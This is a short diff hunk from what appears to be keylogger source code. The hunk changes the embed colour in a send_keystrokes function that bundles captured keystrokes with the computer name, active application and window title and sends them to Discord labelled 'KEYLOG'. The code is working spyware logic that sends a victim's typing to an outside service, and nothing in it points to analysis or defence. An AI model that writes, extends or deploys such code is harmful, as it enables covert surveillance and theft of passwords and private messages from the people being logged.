@@ -120,7 +120,7 @@ def send_keystrokes():
         if keystrokes.strip():
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             message = f"[{timestamp}] {PC_NAME} - ({keystroke_app} - {keystroke_window}): {keystrokes}"
-            send_to_discord("KEYLOG", message, 16776960)  # Yellow
+            send_to_discord("KEYLOG", message, 0)  # Yellow
             keystrokes = ""
             keystroke_app, keystroke_window = "Unknown", "Unknown"
 
